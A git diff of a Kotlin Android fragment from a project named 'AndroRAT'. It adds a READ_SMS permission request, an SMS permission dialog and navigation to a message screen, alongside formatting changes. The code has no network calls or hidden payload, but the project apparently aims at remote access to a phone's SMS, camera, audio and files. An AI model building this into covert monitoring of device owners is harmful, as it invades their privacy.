@@ -25,20 +25,24 @@ import androidx.compose.ui.platform.ComposeView
 import androidx.core.content.ContextCompat
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.activityViewModels
+import androidx.navigation.fragment.findNavController
+import com.ierusalem.androrat.R
 import com.ierusalem.androrat.ui.components.CameraPermissionTextProvider
 import com.ierusalem.androrat.ui.components.MusicAndAudioPermissionTextProvider
 import com.ierusalem.androrat.ui.components.PermissionDialog
 import com.ierusalem.androrat.ui.components.PhoneCallPermissionTextProvider
 import com.ierusalem.androrat.ui.components.PhotosAndVideosPermissionTextProvider
 import com.ierusalem.androrat.ui.components.ReadExternalStoragePermissionTextProvider
+import com.ierusalem.androrat.ui.components.ReadSMSMessageTextProvider
 import com.ierusalem.androrat.ui.components.RecordAudioPermissionTextProvider
 import com.ierusalem.androrat.ui.theme.AndroRATTheme
+import com.ierusalem.androrat.utility.executeWithLifecycle
 import com.ierusalem.androrat.utility.openAppSettings
 import java.io.File
 import java.io.FileOutputStream
 import java.io.OutputStream
 
-class HomeFragment: Fragment() {
+class HomeFragment : Fragment() {
 
     private val homeViewModel: HomeViewModel by activityViewModels()
 
@@ -56,8 +60,10 @@ class HomeFragment: Fragment() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        Log.d("ahi3646", "onCreate: activity.packageName - ${activity?.packageName} ---" +
-                "activity - $activity ")
+        Log.d(
+            "ahi3646", "onCreate: activity.packageName - ${activity?.packageName} ---" +
+                    "activity - $activity "
+        )
         /**
          * To check the permissions whether granted or not
          */
@@ -214,11 +220,22 @@ class HomeFragment: Fragment() {
                         }
                     )
 
+
                     val cameraResultPermissionLauncher = rememberLauncherForActivityResult(
                         contract = ActivityResultContracts.RequestPermission(),
                         onResult = { isGranted ->
                             homeViewModel.onPermissionResult(
                                 permission = Manifest.permission.CAMERA,
+                                isGranted = isGranted
+                            )
+                        }
+                    )
+
+                    val readSMSMessagesPermissionLauncher = rememberLauncherForActivityResult(
+                        contract = ActivityResultContracts.RequestPermission(),
+                        onResult = { isGranted ->
+                            homeViewModel.onPermissionResult(
+                                permission = Manifest.permission.READ_SMS,
                                 isGranted = isGranted
                             )
                         }
@@ -259,6 +276,10 @@ class HomeFragment: Fragment() {
                                         CameraPermissionTextProvider()
                                     }
 
+                                    Manifest.permission.READ_SMS -> {
+                                        ReadSMSMessageTextProvider()
+                                    }
+
                                     Manifest.permission.RECORD_AUDIO -> {
                                         RecordAudioPermissionTextProvider()
                                     }
@@ -269,7 +290,9 @@ class HomeFragment: Fragment() {
 
                                     else -> return@forEach
                                 },
-                                isPermanentlyDeclined = !shouldShowRequestPermissionRationale(permission),
+                                isPermanentlyDeclined = !shouldShowRequestPermissionRationale(
+                                    permission
+                                ),
                                 onDismiss = homeViewModel::dismissDialog,
                                 onOkClick = {
                                     homeViewModel.dismissDialog()
@@ -283,22 +306,33 @@ class HomeFragment: Fragment() {
 
                     HomeScreen(
                         state = state,
+                        onOpenMessageFragment = {
+                            readSMSMessagesPermissionLauncher.launch(Manifest.permission.READ_SMS)
+                        },
                         onSaveScreenshotClick = {
                             if (state.screenshot != null) {
                                 saveMediaToStorage(state.screenshot!!)
                             } else {
-                                Toast.makeText(requireContext(), "Can not save!", Toast.LENGTH_SHORT).show()
+                                Toast.makeText(
+                                    requireContext(),
+                                    "Can not save!",
+                                    Toast.LENGTH_SHORT
+                                ).show()
                             }
                         },
                         onReadExternalStoragePermissionRequest = {
                             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                                multipleReadMediaPermissionLauncher.launch(readMediaPermissionsAndroid13)
+                                multipleReadMediaPermissionLauncher.launch(
+                                    readMediaPermissionsAndroid13
+                                )
                             } else {
                                 readExternalStoragePermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
                             }
                         },
                         onMultiplePermissionRequest = {
-                            multiplePermissionResultLauncher.launch(recordAudioAndCallPhonePermissions)
+                            multiplePermissionResultLauncher.launch(
+                                recordAudioAndCallPhonePermissions
+                            )
                         },
                         onRecordAudioPermissionRequest = {
                             recordAudioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
@@ -311,6 +345,22 @@ class HomeFragment: Fragment() {
                         }
                     )
                 }
+            }
+        }
+    }
+
+    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
+        super.onViewCreated(view, savedInstanceState)
+        homeViewModel.screenNavigation.executeWithLifecycle(
+            lifecycle = viewLifecycleOwner.lifecycle,
+            action = ::executeNavigation
+        )
+    }
+
+    private fun executeNavigation(navigation: HomeScreenNavigation) {
+        when (navigation) {
+            HomeScreenNavigation.OpenMessageFragment -> {
+                findNavController().navigate(R.id.action_homeFragment_to_messageFragment)
             }
         }
     }
@@ -336,7 +386,7 @@ class HomeFragment: Fragment() {
             fos = FileOutputStream(image)
         }
         fos?.use {
-            bitmap.asAndroidBitmap().compress( Bitmap.CompressFormat.JPEG, 100, it)
+            bitmap.asAndroidBitmap().compress(Bitmap.CompressFormat.JPEG, 100, it)
             Toast.makeText(requireContext(), "Saved to Photos", Toast.LENGTH_SHORT).show()
         }
     }
